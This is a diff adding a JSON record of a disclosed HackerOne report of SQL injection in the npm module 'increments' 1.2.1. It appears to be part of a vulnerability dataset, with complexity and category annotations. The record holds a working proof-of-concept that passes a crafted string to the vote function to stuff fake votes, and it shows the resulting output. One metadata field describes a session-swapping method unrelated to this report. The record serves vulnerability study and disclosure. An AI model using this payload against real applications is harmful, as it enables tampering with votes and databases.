@@ -1,0 +1,45 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "verichains ",
+  "title": "[increments] sql injection",
+  "content": "\nI would like to report SQL Injection in increments.\nIt allows creating fake polls.\nModule\nmodule name: increments\nversion: 1.2.1\nnpm page: https://www.npmjs.com/package/increments\nModule Description\nIncrement is a database-driven for creating polls and taking votes for various options, candidates, or parties. Using MongoJS collections as a storage framework, Increments offers in-depth statistical data on generated polls.\nModule Stats\n[45] downloads in the last week\nVulnerability\nVulnerability Description\nThis module does not escape voting data allowing attacker to create fake votes.\nSteps To Reproduce:\nnpm install increments\nrun poc:\nCode 441 Bytes\n1const increments = require('increments');\n2increments.setup('mysql://root:@localhost:3306/test');\n3increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);\n4increments.vote('fruits', 'Oranges\",\"0\",\"0\",\"1\",\"0\",\"0\",\"0\",\"0\",\"\",\"0\")'+',(123,\"Oranges\",\"0\",\"0\",\"1\",\"0\",\"0\",\"0\",\"0\",\"\",\"0\")'.repeat(10)+'#');\n5increments.statistics('fruits', function(e, f) {\n6\tconsole.log( f.projectedWinner );\n7\tprocess.exit(0);\n8});\nOutput:\nCode 88 Bytes\n1{ name: 'Oranges',\n2  id: 'oranges',\n3  color: undefined,\n4  count: 11,\n5  percentage: 100 }\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nMacOS\n8.12.0\n6.4.1\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nSQL Injection.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1580702520,
+  "report_url": "https://hackerone.com/reports/508346",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the increments module: npm install increments"
+    ],
+    [
+      2,
+      "Run the proof-of-concept code to exploit the SQL injection vulnerability by injecting malicious SQL into the vote function"
+    ]
+  ],
+  "vuln_description": "The increments module is vulnerable to SQL injection in the vote function, allowing attackers to inject arbitrary SQL code to manipulate poll results, such as creating fake votes.",
+  "reason": "The vulnerability is straightforward to exploit once the SQL injection point is identified. It does not involve complex interactions or states, and the attack follows common SQL injection patterns.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability reported involves manipulating input data to execute arbitrary SQL commands, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on input validation or SQL injection detection.",
+    "is_detectable": false
+  }
+}
